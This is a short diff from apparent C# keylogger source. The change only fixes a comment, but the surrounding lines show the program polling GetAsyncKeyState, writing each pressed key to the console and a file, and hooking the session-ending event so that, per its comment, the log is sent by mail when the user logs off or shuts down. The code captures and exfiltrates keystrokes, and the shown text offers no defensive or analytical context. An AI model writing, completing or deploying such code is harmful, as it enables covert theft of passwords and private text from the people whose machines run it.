@@ -62,8 +62,8 @@ namespace Keylogger
                             int keyState = GetAsyncKeyState(i);
                             if (keyState == 1 || keyState == -32767)
                             {
-                                SystemEvents.SessionEnding += SystemEvents_SessionEnding; //If program detects user logging off or shuting down system
-                                //it sends mail
+                                SystemEvents.SessionEnding += SystemEvents_SessionEnding; //If program detects user logging off or 
+                                //shutting down system it sends mail
                                 Console.WriteLine((Keys)i);
                                 writer.WriteLine((Keys)i);
                                 writer.Flush();
